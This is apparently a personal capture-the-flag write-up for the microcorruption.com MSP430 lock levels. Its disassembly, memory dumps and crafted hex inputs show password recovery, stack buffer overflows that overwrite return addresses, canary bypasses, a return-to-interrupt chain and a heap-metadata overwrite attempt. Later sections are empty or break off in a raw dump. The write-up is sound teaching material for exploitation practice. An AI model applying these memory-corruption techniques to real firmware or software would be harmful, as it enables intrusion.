# `microcorruption.com`

Here, I will provide my solutions to the challenges on
[microcorruption.com].  They may be somewhat terse, but I will try to
make them at least complete.

If you are following along to learn, you should note that specific
values throughout will vary between different users, so the solutions
that work for me will often not work for you verbatim.

## 1. New Orleans

Looking at the main function, we see it follows a simple flow: Create
the password, whatever that means (at 0x443c), get the inputted
password (0x444a), check the password (0x4450) and either exit
(0x4460) or unlock the door (0x446a) accordingly.

We'll start by seeing what the check_password function does, and
whether we can easily make a password that causes it to affirm that
our password was correct.

We see that it will compare, byte-by-byte, the entered password to the
string stored at 0x2400.  So we break at `check_password` and examine
memory at that location:


```
2400: 2575 2c6a 7138 4900 0000 0000 0000 0000 %u,jq8I.........
```

And behold, the password: `%u,jq8I`.

## 2. Sydney

Once again, the main function has a `check_password` call, so we start
by looking at what `check_password` is doing.  We break at this
function, having entered a password of AAAAAAAA, and observe that it
appears to be comparing our password to something hard-coded into the prorgram:

```
448a:  bf90 7256 0000 cmp	#0x5672, 0x0(r15)
4490:  0d20           jnz	$+0x1c
4492:  bf90 2a49 0200 cmp	#0x492a, 0x2(r15)
4498:  0920           jnz	$+0x14
449a:  bf90 4b3a 0400 cmp	#0x3a4b, 0x4(r15)
44a0:  0520           jne	#0x44ac <check_password+0x22>
44a2:  1e43           mov	#0x1, r14
44a4:  bf90 5b28 0600 cmp	#0x285b, 0x6(r15)
44aa:  0124           jeq	#0x44ae <check_password+0x24>
```

Because of little-endianness, this amonuts to comparing our password to the sequence of bytes:

```
0x72 0x56 0x2a 0x49 0x4b 0x3a 0x5b 0x28
```

Which is:

```
$ echo -e '\x72\x56\x2a\x49\x4b\x3a\x5b\x28'
rV*IK:[(
```

## 3. Hanoi

The input tells us that the password is 8-16 characters, so we start by inputting more, namely (in hex):

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbccddee
```

We break at `0x4540` (after the `getsn` call) and observe that our input has filled RAM with:

```
2400:   aaaa aaaa aaaa aaaa aaaa aaaa aaaa aaaa   ................
2410:   bbcc ddee 0000 0000 0000 0000 0000 0000   ................
```

Stepping through the instructions after that, we see the program run through the instruction:

```
455a:  f290 c200 1024 cmp.b	#0xc2, &0x2410
4560:  0720           jne	#0x4570 <login+0x50>
4562:  3f40 f144      mov	#0x44f1 "Access granted.", r15
4566:  b012 de45      call	#0x45de <puts>
456a:  b012 4844      call	#0x4448 <unlock_door>
```

So it will unlock the door if `0x2410` contains the byte value c2.  We
control the value at this address with our input, so we happily
provide a new input:


```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaac2
```

Which opens the lock.

## 4. Reykjavik

The main function for this lock is small:

```
4438 <main>
4438:  3e40 2045      mov	#0x4520, r14
443c:  0f4e           mov	r14, r15
443e:  3e40 f800      mov	#0xf8, r14
4442:  3f40 0024      mov	#0x2400, r15
4446:  b012 8644      call	#0x4486 <enc>
444a:  b012 0024      call	#0x2400
444e:  0f43           clr	r15
```

This code appears to encrypt a bunch of stuff in some way, store the
result at `0x2400`, and then (at address `0x444a`) call `0x2400`.

The code stored at `0x2400` looks like:

```
2400:   0b12 0412 0441 2452 3150 e0ff 3b40 2045   .....A$R1P..;@ E
2410:   073c 1b53 8f11 0f12 0312 b012 6424 2152   .<.S........d$!R
2420:   6f4b 4f93 f623 3012 0a00 0312 b012 6424   oKO..#0.......d$
2430:   2152 3012 1f00 3f40 dcff 0f54 0f12 2312   !R0...?@...T..#.
2440:   b012 6424 3150 0600 b490 c4fd dcff 0520   ..d$1P......... 
2450:   3012 7f00 b012 6424 2153 3150 2000 3441   0....d$!S1P .4A
2460:   3b41 3041 1e41 0200 0212 0f4e 8f10 024f   ;A0A.A.....N...O
2470:   32d0 0080 b012 1000 3241 3041 d21a 189a   2.......2A0A....
2480:   22dc 45b9 4279 2d55 858e a4a2 67d7 14ae   ".E.By-U....g...
2490:   a119 76f6 42cb 1c04 0efa a61b 74a7 416b   ..v.B.......t.Ak
24a0:   d237 a253 22e4 66af c1a5 938b 8971 9b88   .7.S".f......q..
24b0:   fa9b 6674 4e21 2a6b b143 9151 3dcc a6f5   ..ftN!*k.C.Q=...
24c0:   daa7 db3f 8d3c 4d18 4736 dfa6 459a 2461   ...?.<M.G6..E.$a
24d0:   921d 3291 14e6 8157 b0fe 2ddd 400b 8688   ..2....W..-.@...
24e0:   6310 3ab3 612b 0bd9 483f 4e04 5870 4c38   c.:.a+..H?N.XpL8
24f0:   c93c ff36 0e01 7f3e fa55 aeef 051c 242c   .<.6..>.U....$,
2500:   3c56 13af e57b 8abf 3040 c537 656e 8278   <V...{..0@.7en.x
2510:   9af9 9d02 be83 b38c e181 3ad8 395a fce3   ..........:.9Z..
2520:   4f03 8ec9 9395 4a15 ce3b fd1e 7779 c9c3   O.....J..;..wy..
2530:   5ff2 3dc7 5953 8826 d0b5 d9f8 639e e970   _.=.YS.&....c..p
2540:   01cd 2119 ca6a d12c 97e2 7538 96c5 8f28   ..!..j.,..u8...(
2550:   d682 1be5 ab20 7389 48aa 1fa3 472f a564   ..... s.H...G/.d
2560:   de2d b710 9081 5205 8d44 cff4 bc2e 577a   .-....R..D....Wz
2570:   d5f4 a851 c243 277d a4ca 1e6b 0000 0000   ...Q.C'}...k....
```

So if we disassemble this (using the provided disassembler), we see
the following (which we have here annotated somewhat):

```
0b12           push	r11
0412           push	r4
0441           mov	sp, r4
2452           add	#0x4, r4
3150 e0ff      add	#0xffe0, sp
3b40 2045      mov	#0x4520, r11
073c           jmp	$+0x10
1b53           inc	r11
8f11           sxt	r15
0f12           push	r15
0312           push	#0x0
b012 6424      call	#0x2464 <func1>
2152           add	#0x4, sp
6f4b           mov.b	@r11, r15
4f93           tst.b	r15
f623           jnz	$-0x12
3012 0a00      push	#0xa
0312           push	#0x0
b012 6424      call	#0x2464
2152           add	#0x4, sp
3012 1f00      push	#0x1f
3f40 dcff      mov	#0xffdc, r15
0f54           add	r4, r15
0f12           push	r15
2312           push	#0x2
b012 6424      call	#0x2464 <func1>
3150 0600      add	#0x6, sp
b490 c4fd dcff cmp	#0xfdc4, -0x24(r4)
0520           jnz	$+0xc
3012 7f00      push	#0x7f   
b012 6424      call	#0x2464 <func1>
2153           incd	sp
3150 2000      add	#0x20, sp
3441           pop	r4
3b41           pop	r11
3041           ret
<func1>
1e41 0200      mov	0x2(sp), r14
0212           push	sr
0f4e           mov	r14, r15
8f10           swpb	r15
024f           mov	r15, sr
32d0 0080      bis	#0x8000, sr
b012 1000      call	#0x10
3241           pop	sr
3041           ret
```

In particular, as 0x7f is the interrupt number for unlocking the door,
the bit of code:

```
b490 c4fd dcff cmp	#0xfdc4, -0x24(r4)
0520           jnz	$+0xc
3012 7f00      push	#0x7f   
b012 6424      call	#0x2464 <func1>
```

Seems like the portion responsible for testing the password.

This happens at address `0x2448`.  Thus we will break at this point,
enter the password:

```
ff0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f
```

(we would start this with `00` instead of `ff`, but the null byte is
often a terminator for strings, so this seems dangerous) and see if we
control the address it is checking.

First of all, we notice that once our breakpoint at `0x2448` is
reached, the stack looks like:

```
43c0:   0000 0000 0000 0000 0000 0000 0000 7824   ..............x$
43d0:   0100 4424 0200 da43 1f00 ff01 0203 0405   ..D$...C........
43e0:   0607 0809 0a0b 0c0d 0e0f 1011 1213 1415   ................
43f0:   1617 1819 1a1b 1c1d 1e00 0000 0000 4e44   ..............ND
```

So the first 31 of our input values have been used.  Furthermore, the
registers contain the values:

```
pc  2448  sp  43da  sr  0000  cg  0000
r04 43fe  r05 5a08  r06 0000  r07 0000
r08 0000  r09 0000  r10 0000  r11 4534
r12 00f8  r13 00c4  r14 0002  r15 0200
```

Thus r4-0x24 is 0x43da, which contains the value `0xff 0x01`--the
start of our password.  So perhaps a password of (in hex) simply
`c4fd` (accounting for endianness) will do?

Seems so.

## 5. Cusco

We once again try the same password: 

```
ff0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f
```

And behold, it is stored on the stack in full at address `0x43ee`:

```
43d0:   0000 0000 0000 0000 0000 0000 5645 0100   ............VE..
43e0:   5645 0300 ca45 0000 0a00 0000 3a45 ff01   VE...E......:E..
43f0:   0203 0405 0607 0809 0a0b 0c0d 0e0f 1011   ................
4400:   1213 1415 1617 1819 1a1b 1c1d 1e1f 0040   ...............@
```

It does not unlock the door, however we notice that when the login
function is about to return, the registers are:

```
pc  453e  sp  43fe  sr  0000  cg  0000
r04 0000  r05 5a08  r06 0000  r07 0000
r08 0000  r09 0000  r10 0000  r11 0000
r12 0000  r13 0000  r14 0000  r15 0000
```

In particular, `sp` is an address within our password.  So as entered,
it will return to address 1110.  Thus if we instead input a password
of 16 bytes followed by the address of the `unlock_door` function, we
should get the door open: 

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa4644
```

## 6. Johannesburg

Yet again, we try the password:

```
ff0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f
```

In this case, the password is again rejected, but this time, the
program straight-up exits as a result of:

```
4578:  f190 a000 1100 cmp.b	#0xa0, 0x11(sp)
457e:  0624           jeq	#0x458c <login+0x60>
4580:  3f40 ff44      mov	#0x44ff "Invalid Password Length: password too long.", r15
4584:  b012 f845      call	#0x45f8 <puts>
4588:  3040 3c44      br	#0x443c <__stop_progExec__>
```

Apparently, since `sp+0x11` doesn't contain the value `0xa0`, the
password is seen as being too long.  This kind of rudimentary stack
canary is easily defeated, however.  We break at address `0x4578` and
observe that the stack looks like:

```
43e0:   0300 1c46 0000 0a00 0000 7845 ff01 0203   ...F......xE....
43f0:   0405 0607 0809 0a0b 0c0d 0e0f 1011 1213   ................
4400:   1415 1617 1819 1a1b 1c1d 1e1f 005a 3f40   .............Z?@
```

with registers:

```
pc  4578  sp  43ec  sr  0000  cg  0000
r04 0000  r05 5a08  r06 0000  r07 0000
r08 0000  r09 0000  r10 0000  r11 0000
r12 0000  r13 440c  r14 0000  r15 0000
```

Thus `sp+0x11` is the value `0x11` in our password.  Thus if we enter
17 bytes, followed by `0xa0`, we should bypass this check:

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0bbcc
```

And now we notice that the login function continues to the final `ret`
instruction, which will return to address `ccbb` in this case.  If we
make it instead return to the `unlock_door` function at `0x4446`,
we're set:


```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa04644
```

## 7. Whitehorse

As usual, starting out with a password of


```
ff0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f
```

We notice for this one that the password is rejected, and that the
`ret` instruction of the `login` function is reached without any
issue.  If we break at this `ret` instruction, we see that the
registers and stack look like:

```
pc  452e  sp  362a  sr  0000  cg  0000
r04 0000  r05 5a08  r06 0000  r07 0000
r08 0000  r09 0000  r10 0000  r11 0000
r12 0000  r13 0000  r14 0000  r15 0000

3600:   0000 0000 0000 0000 4645 0100 4645 0300   ........FE..FE..
3610:   ba45 0000 0a00 0000 2a45 ff01 0203 0405   .E......*E......
3620:   0607 0809 0a0b 0c0d 0e0f 1011 1213 1415   ................
3630:   1617 1819 1a1b 1c1d 1e1f 0000 0000 0000   ................
```

In particular, bytes 16-17 of the password will be used as the return
address.  But this time, there is no code in the program to unlock the
door that we can just return to.  However, we do have the INT function
at `0x4532`, which expects the interrupt number to be pushed on the
stack.  So if we make the password 16 bytes followed by the address of
the INT function, say:

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa3245bbbbcccc
```

then the INT function will expect the `bbbb` to be the return address,
and the `cccc` to be the argument.  We may as well have the program
stop after we open the door as normal, so we make the return address
the address of the "stop the program" code at `0x443c`, and we make
the argument `0x007f`.  Thus our password will be:

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa32453c447f00
```

# Writeups in progress:

## 8.  Santa Cruz

This is an odd one.  It requires a username and password, both between 8 and 16 bytes.

The method of enforcing this is the following:

After the username and password have been entered, the stack (with
sp=0x43a0) looks like:

```
43a0:   0000 4142 4344 4546 4748 494a 0000 0000   ..ABCDEFGHIJ....
43b0:   0000 0008 1061 6263 6465 6667 6869 6a6b   .....abcdefghijk
43c0:   6c6d 0000 0000 0000 0000 0000 4044 0000   lm..........@D..
```

Notice the 08 and 10 at 43b3.  We note that these are the stated upper
and lower bounds for the lengths of the username and password, and
indeed, if we watch the execution, we see that these are indeed used
for checking lengths.

Since the code that actually reads the username is:

```
4582:  3e40 6300      mov	#0x63, r14
4586:  3f40 0424      mov	#0x2404, r15
458a:  b012 1847      call	#0x4718 <getsn>
```

We actually get 0x63 bytes of username, with which we can clearly
overwrite these values.  Of course, strcpy means we cannot have any
null bytes.  But we can use the username to overwrite these values
with the bytes 01 and 7f--the minimum and maximum positive integers
expressed by a signed byte.

Thus our username will be (in hex):

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa017f

However, the password must also end in a null byte.  The following
snippet appears at the end of the `login` function:

```
4644:  3f40 3145      mov	#0x4531 "That password is not correct.", r15
4648:  b012 2847      call	#0x4728 <puts>
464c:  c493 faff      tst.b	-0x6(r4)
4650:  0624           jz	#0x465e <login+0x10e>
4652:  1f42 0024      mov	&0x2400, r15
4656:  b012 2847      call	#0x4728 <puts>
465a:  3040 4044      br	#0x4440 <__stop_progExec__>
465e:  3150 2800      add	#0x28, sp
4662:  3441           pop	r4
4664:  3b41           pop	r11
4666:  3041           ret
```

In particular, the instruction at 464c will test for a null byte 18
bytes after the start of the password.  So if we make the password
super long and overflow the return address (which, breaking at the
`ret` instruction, we can discover is at 43cc), this test will
fail and we will exit without returning (on address 465a).

Thus we can do the following trick: We can make the username long
enough to overflow the stack pointer, and we can make the password
exactly 17 bytes, so that a null byte will be written to the 18th byte
after the start of the password.  Of course, we still need byte
offsets 17 and 18 of the username to be 01 and 7f respectively to get
away with this excessive length.

So we try: 

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa017fa0a1a2a3a4a5a6a7a8a9a0aaabacadaeafb0b1b2b3b4b5b6b7b8b9b0babbbcbdbebf
cccccccccccccccccccccccccccccccccc
```

And we observe that this reaches the return instruction and b7b6 is
placed into pc.  Therefore we replace this with the address of the
`unlock_door` function: 444a for a final answer of:

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa017fa0a1a2a3a4a5a6a7a8a9a0aaabacadaeafb0b1b2b3b4b54a44
cccccccccccccccccccccccccccccccccc
```

## 9.  Addis Ababa



## 10. Montevideo



## 11. Jakarta



## 12. Novosibirsk



## 13. Algiers
     This is a malloc implementation. Here is the heap under normal
     circumstances after two mallocs of 16-byte blocks (starting at
     240e and 2424 with 6-byte headers at the beginning and end of
     each block), all filled with the byte 0xaa repeated: 

```
2400:   0824 0010 0000 0000 0824 1e24 2100 aaaa   .$.......$.$!...
2410:   aaaa aaaa aaaa aaaa aaaa aaaa aaaa 0824   ...............$
2420:   3424 2100 aaaa aaaa aaaa aaaa aaaa aaaa   4$!.............
2430:   aaaa aaaa 1e24 0824 9c1f 0000 0000 0000   .....$.$........

```

And after the first free: 

```
2400:   0824 0010 0000 0000 0824 1e24 2100 aaaa   .$.......$.$!...
2410:   aaaa aaaa aaaa aaaa aaaa aaaa aaaa 0824   ...............$
2420:   0824 c21f aaaa aaaa aaaa aaaa aaaa aaaa   .$..............
2430:   aaaa aaaa 1e24 0824 9c1f 0000 0000 0000   .....$.$........
```

So the free function uses the information in the headers to overwrite
values in RAM (supposedly, the contents of other headers).  We control
the headers, so maybe we can use this to get an arbitrary 1-word
write.  

We can overflow the heap with inputs:

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa02b202c202d2
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa04b404c404d4
```

This way, all the headers that we can overwrite get overwritten with
distinct values, so that as the free function runs, we can tell which
pieces of which headers are being used in the various  write into RAM.

The free function has a few instructions that write to RAM.  We break
at each one and examine what it is doing.  

Following these, we find: 

```
[b206] gets overwritten with d20e
[c202] gets overwritten with b202
```

If we're going to target a single word for an overwrite, it is the
value of sp when the free function returns, i.e. `4394`, and we will
overwrite this with the address of the `unlock_door` function,
i.e. `4564`.

Seemingly, we can do this by doing: 

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa904300086045
aa
```

This appears to overwrite the sp with ffff, so we try: 


```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa924300006445
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa08243e242100
```

## 14. Vladivostok

```
0xcaaa-0xc740 = 874 = 0x36a
```

```
0010 <__trap_interrupt>
0010:  3041           ret
4400 <__init_stack>
4400:  3140 0044      mov	#0x4400, sp
4404 <__low_level_init>
4404:  1542 5c01      mov	&0x015c, r5
4408:  75f3           and.b	#-0x1, r5
440a:  35d0 085a      bis	#0x5a08, r5
440e <__do_copy_data>
440e:  3f40 0000      clr	r15
4412:  0f93           tst	r15
4414:  0724           jz	#0x4424 <__do_clear_bss+0x0>
4416:  8245 5c01      mov	r5, &0x015c
441a:  2f83           decd	r15
441c:  9f4f 704a 0024 mov	0x4a70(r15), 0x2400(r15)
4422:  f923           jnz	#0x4416 <__do_copy_data+0x8>
4424 <__do_clear_bss>
4424:  3f40 3200      mov	#0x32, r15
4428:  0f93           tst	r15
442a:  0624           jz	#0x4438 <main+0x0>
442c:  8245 5c01      mov	r5, &0x015c
4430:  1f83           dec	r15
4432:  cf43 0024      mov.b	#0x0, 0x2400(r15)
4436:  fa23           jnz	#0x442c <__do_clear_bss+0x8>
4438 <main>
4438:  b012 1c4a      call	#0x4a1c <rand>
443c:  0b4f           mov	r15, r11
443e:  3bf0 fe7f      and	#0x7ffe, r11
4442:  3b50 0060      add	#0x6000, r11
4446:  b012 1c4a      call	#0x4a1c <rand>
444a:  0a4f           mov	r15, r10
444c:  3012 0010      push	#0x1000
4450:  3012 0044      push	#0x4400 <__init_stack>
4454:  0b12           push	r11
4456:  b012 e849      call	#0x49e8 <_memcpy>
445a:  3150 0600      add	#0x6, sp
445e:  0f4a           mov	r10, r15
4460:  3ff0 fe0f      and	#0xffe, r15
4464:  0e4b           mov	r11, r14
4466:  0e8f           sub	r15, r14
4468:  3e50 00ff      add	#0xff00, r14
446c:  0d4b           mov	r11, r13
446e:  3d50 5c03      add	#0x35c, r13
4472:  014e           mov	r14, sp
4474:  0f4b           mov	r11, r15
4476:  8d12           call	r13
4478 <__stop_progExec__>
4478:  32d0 f000      bis	#0xf0, sr
447c:  fd3f           jmp	#0x4478 <__stop_progExec__+0x0>
447e <__ctors_end>
447e:  3040 6e4a      br	#0x4a6e <_unexpected_>
4482 <_aslr_main>
4482:  0b12           push	r11
4484:  0a12           push	r10
4486:  3182           sub	#0x8, sp
4488:  0c4f           mov	r15, r12
448a:  3c50 6a03      add	#0x36a, r12
448e:  814c 0200      mov	r12, 0x2(sp)
4492:  0e43           clr	r14
4494:  ce43 0044      mov.b	#0x0, 0x4400(r14)
4498:  1e53           inc	r14
449a:  3e90 0010      cmp	#0x1000, r14
449e:  fa23           jne	#0x4494 <_aslr_main+0x12>
44a0:  f240 5500 0224 mov.b	#0x55, &0x2402
44a6:  f240 7300 0324 mov.b	#0x73, &0x2403
44ac:  f240 6500 0424 mov.b	#0x65, &0x2404
44b2:  f240 7200 0524 mov.b	#0x72, &0x2405
44b8:  f240 6e00 0624 mov.b	#0x6e, &0x2406
44be:  f240 6100 0724 mov.b	#0x61, &0x2407
44c4:  f240 6d00 0824 mov.b	#0x6d, &0x2408
44ca:  f240 6500 0924 mov.b	#0x65, &0x2409
44d0:  f240 2000 0a24 mov.b	#0x20, &0x240a
44d6:  f240 2800 0b24 mov.b	#0x28, &0x240b
44dc:  f240 3800 0c24 mov.b	#0x38, &0x240c
44e2:  f240 2000 0d24 mov.b	#0x20, &0x240d
44e8:  f240 6300 0e24 mov.b	#0x63, &0x240e
44ee:  f240 6800 0f24 mov.b	#0x68, &0x240f
44f4:  f240 6100 1024 mov.b	#0x61, &0x2410
44fa:  f240 7200 1124 mov.b	#0x72, &0x2411
4500:  f240 2000 1224 mov.b	#0x20, &0x2412
4506:  f240 6d00 1324 mov.b	#0x6d, &0x2413
450c:  f240 6100 1424 mov.b	#0x61, &0x2414
4512:  f240 7800 1524 mov.b	#0x78, &0x2415
4518:  f240 2900 1624 mov.b	#0x29, &0x2416
451e:  f240 3a00 1724 mov.b	#0x3a, &0x2417
4524:  c243 1824      mov.b	#0x0, &0x2418
4528:  b240 1700 0024 mov	#0x17, &0x2400
452e:  3e40 0224      mov	#0x2402, r14
4532:  0b43           clr	r11
4534:  103c           jmp	#0x4556 <_aslr_main+0xd4>
4536:  1e53           inc	r14
4538:  8d11           sxt	r13
453a:  0b12           push	r11
453c:  0d12           push	r13
453e:  0b12           push	r11
4540:  0012           push	pc
4542:  0212           push	sr
4544:  0f4b           mov	r11, r15
4546:  8f10           swpb	r15
4548:  024f           mov	r15, sr
454a:  32d0 0080      bis	#0x8000, sr
454e:  b012 1000      call	#0x10
4552:  3241           pop	sr
4554:  3152           add	#0x8, sp
4556:  6d4e           mov.b	@r14, r13
4558:  4d93           tst.b	r13
455a:  ed23           jnz	#0x4536 <_aslr_main+0xb4>
455c:  0e43           clr	r14
455e:  3d40 0a00      mov	#0xa, r13
4562:  0e12           push	r14
4564:  0d12           push	r13
4566:  0e12           push	r14
4568:  0012           push	pc
456a:  0212           push	sr
456c:  0f4e           mov	r14, r15
456e:  8f10           swpb	r15
4570:  024f           mov	r15, sr
4572:  32d0 0080      bis	#0x8000, sr
4576:  b012 1000      call	#0x10
457a:  3241           pop	sr
457c:  3152           add	#0x8, sp
457e:  3d50 3400      add	#0x34, r13
4582:  0e12           push	r14
4584:  0d12           push	r13
4586:  0e12           push	r14
4588:  0012           push	pc
458a:  0212           push	sr
458c:  0f4e           mov	r14, r15
458e:  8f10           swpb	r15
4590:  024f           mov	r15, sr
4592:  32d0 0080      bis	#0x8000, sr
4596:  b012 1000      call	#0x10
459a:  3241           pop	sr
459c:  3152           add	#0x8, sp
459e:  0e12           push	r14
45a0:  0d12           push	r13
45a2:  0e12           push	r14
45a4:  0012           push	pc
45a6:  0212           push	sr
45a8:  0f4e           mov	r14, r15
45aa:  8f10           swpb	r15
45ac:  024f           mov	r15, sr
45ae:  32d0 0080      bis	#0x8000, sr
45b2:  b012 1000      call	#0x10
45b6:  3241           pop	sr
45b8:  3152           add	#0x8, sp
45ba:  3a42           mov	#0x8, r10
45bc:  3b40 2624      mov	#0x2426, r11
45c0:  2d43           mov	#0x2, r13
45c2:  0a12           push	r10
45c4:  0b12           push	r11
45c6:  0d12           push	r13
45c8:  0012           push	pc
45ca:  0212           push	sr
45cc:  0f4d           mov	r13, r15
45ce:  8f10           swpb	r15
45d0:  024f           mov	r15, sr
45d2:  32d0 0080      bis	#0x8000, sr
45d6:  b012 1000      call	#0x10
45da:  3241           pop	sr
45dc:  3152           add	#0x8, sp
45de:  c24e 2e24      mov.b	r14, &0x242e
45e2:  0b12           push	r11
45e4:  8c12           call	r12
45e6:  2153           incd	sp
45e8:  0f4b           mov	r11, r15
45ea:  033c           jmp	#0x45f2 <_aslr_main+0x170>
45ec:  cf43 0000      mov.b	#0x0, 0x0(r15)
45f0:  1f53           inc	r15
45f2:  3f90 3224      cmp	#0x2432, r15
45f6:  fa23           jne	#0x45ec <_aslr_main+0x16a>
45f8:  f240 0a00 0224 mov.b	#0xa, &0x2402
45fe:  f240 5000 0324 mov.b	#0x50, &0x2403
4604:  f240 6100 0424 mov.b	#0x61, &0x2404
460a:  f240 7300 0524 mov.b	#0x73, &0x2405
4610:  f240 7300 0624 mov.b	#0x73, &0x2406
4616:  f240 7700 0724 mov.b	#0x77, &0x2407
461c:  f240 6f00 0824 mov.b	#0x6f, &0x2408
4622:  f240 7200 0924 mov.b	#0x72, &0x2409
4628:  f240 6400 0a24 mov.b	#0x64, &0x240a
462e:  f240 3a00 0b24 mov.b	#0x3a, &0x240b
4634:  c243 0c24      mov.b	#0x0, &0x240c
4638:  3e40 0224      mov	#0x2402, r14
463c:  0c43           clr	r12
463e:  103c           jmp	#0x4660 <_aslr_main+0x1de>
4640:  1e53           inc	r14
4642:  8d11           sxt	r13
4644:  0c12           push	r12
4646:  0d12           push	r13
4648:  0c12           push	r12
464a:  0012           push	pc
464c:  0212           push	sr
464e:  0f4c           mov	r12, r15
4650:  8f10           swpb	r15
4652:  024f           mov	r15, sr
4654:  32d0 0080      bis	#0x8000, sr
4658:  b012 1000      call	#0x10
465c:  3241           pop	sr
465e:  3152           add	#0x8, sp
4660:  6d4e           mov.b	@r14, r13
4662:  4d93           tst.b	r13
4664:  ed23           jnz	#0x4640 <_aslr_main+0x1be>
4666:  0e43           clr	r14
4668:  3d40 0a00      mov	#0xa, r13
466c:  0e12           push	r14
466e:  0d12           push	r13
4670:  0e12           push	r14
4672:  0012           push	pc
4674:  0212           push	sr
4676:  0f4e           mov	r14, r15
4678:  8f10           swpb	r15
467a:  024f           mov	r15, sr
467c:  32d0 0080      bis	#0x8000, sr
4680:  b012 1000      call	#0x10
4684:  3241           pop	sr
4686:  3152           add	#0x8, sp
4688:  0b41           mov	sp, r11
468a:  2b52           add	#0x4, r11
468c:  3c40 1400      mov	#0x14, r12
4690:  2d43           mov	#0x2, r13
4692:  0c12           push	r12
4694:  0b12           push	r11
4696:  0d12           push	r13
4698:  0012           push	pc
469a:  0212           push	sr
469c:  0f4d           mov	r13, r15
469e:  8f10           swpb	r15
46a0:  024f           mov	r15, sr
46a2:  32d0 0080      bis	#0x8000, sr
46a6:  b012 1000      call	#0x10
46aa:  3241           pop	sr
46ac:  3152           add	#0x8, sp
46ae:  3d50 7c00      add	#0x7c, r13
46b2:  0c41           mov	sp, r12
46b4:  0c12           push	r12
46b6:  0b12           push	r11
46b8:  0d12           push	r13
46ba:  0012           push	pc
46bc:  0212           push	sr
46be:  0f4d           mov	r13, r15
46c0:  8f10           swpb	r15
46c2:  024f           mov	r15, sr
46c4:  32d0 0080      bis	#0x8000, sr
46c8:  b012 1000      call	#0x10
46cc:  3241           pop	sr
46ce:  3152           add	#0x8, sp
46d0:  f240 5700 0224 mov.b	#0x57, &0x2402
46d6:  f240 7200 0324 mov.b	#0x72, &0x2403
46dc:  f240 6f00 0424 mov.b	#0x6f, &0x2404
46e2:  f240 6e00 0524 mov.b	#0x6e, &0x2405
46e8:  f240 6700 0624 mov.b	#0x67, &0x2406
46ee:  f240 2100 0724 mov.b	#0x21, &0x2407
46f4:  c24e 0824      mov.b	r14, &0x2408
46f8:  b240 0700 0024 mov	#0x7, &0x2400
46fe:  3d40 0224      mov	#0x2402, r13
4702:  103c           jmp	#0x4724 <_aslr_main+0x2a2>
4704:  1d53           inc	r13
4706:  8c11           sxt	r12
4708:  0e12           push	r14
470a:  0c12           push	r12
470c:  0e12           push	r14
470e:  0012           push	pc
4710:  0212           push	sr
4712:  0f4e           mov	r14, r15
4714:  8f10           swpb	r15
4716:  024f           mov	r15, sr
4718:  32d0 0080      bis	#0x8000, sr
471c:  b012 1000      call	#0x10
4720:  3241           pop	sr
4722:  3152           add	#0x8, sp
4724:  6c4d           mov.b	@r13, r12
4726:  4c93           tst.b	r12
4728:  ed23           jnz	#0x4704 <_aslr_main+0x282>
472a:  0e43           clr	r14
472c:  3d40 0a00      mov	#0xa, r13
4730:  0e12           push	r14
4732:  0d12           push	r13
4734:  0e12           push	r14
4736:  0012           push	pc
4738:  0212           push	sr
473a:  0f4e           mov	r14, r15
473c:  8f10           swpb	r15
473e:  024f           mov	r15, sr
4740:  32d0 0080      bis	#0x8000, sr
4744:  b012 1000      call	#0x10
4748:  3241           pop	sr
474a:  3152           add	#0x8, sp
474c:  0e41           mov	sp, r14
474e:  2e53           incd	r14
4750:  0e12           push	r14
4752:  3f41           pop	r15
4754:  3152           add	#0x8, sp
4756:  3a41           pop	r10
4758:  3b41           pop	r11
475a:  3041           ret
475c <aslr_main>
475c:  0e4f           mov	r15, r14
475e:  3e50 8200      add	#0x82, r14
4762:  8e12           call	r14
4764:  32d0 f000      bis	#0xf0, sr
4768:  3041           ret
476a <printf>
476a:  0b12           push	r11
476c:  0a12           push	r10
476e:  0912           push	r9
4770:  0812           push	r8
4772:  0712           push	r7
4774:  0612           push	r6
4776:  0412           push	r4
4778:  0441           mov	sp, r4
477a:  3450 0e00      add	#0xe, r4
477e:  2183           decd	sp
4780:  1a44 0200      mov	0x2(r4), r10
4784:  8441 f0ff      mov	sp, -0x10(r4)
4788:  0f4a           mov	r10, r15
478a:  0e43           clr	r14
478c:  0b3c           jmp	#0x47a4 <printf+0x3a>
478e:  1f53           inc	r15
4790:  7d90 2500      cmp.b	#0x25, r13
4794:  0720           jne	#0x47a4 <printf+0x3a>
4796:  6d9f           cmp.b	@r15, r13
4798:  0320           jne	#0x47a0 <printf+0x36>
479a:  1f53           inc	r15
479c:  0d43           clr	r13
479e:  013c           jmp	#0x47a2 <printf+0x38>
47a0:  1d43           mov	#0x1, r13
47a2:  0e5d           add	r13, r14
47a4:  6d4f           mov.b	@r15, r13
47a6:  4d93           tst.b	r13
47a8:  f223           jnz	#0x478e <printf+0x24>
47aa:  0f4e           mov	r14, r15
47ac:  0f5f           add	r15, r15
47ae:  2f53           incd	r15
47b0:  018f           sub	r15, sp
47b2:  0b41           mov	sp, r11
47b4:  0c44           mov	r4, r12
47b6:  2c52           add	#0x4, r12
47b8:  0f41           mov	sp, r15
47ba:  0d43           clr	r13
47bc:  053c           jmp	#0x47c8 <printf+0x5e>
47be:  af4c 0000      mov	@r12, 0x0(r15)
47c2:  1d53           inc	r13
47c4:  2f53           incd	r15
47c6:  2c53           incd	r12
47c8:  0d9e           cmp	r14, r13
47ca:  f93b           jl	#0x47be <printf+0x54>
47cc:  0c43           clr	r12
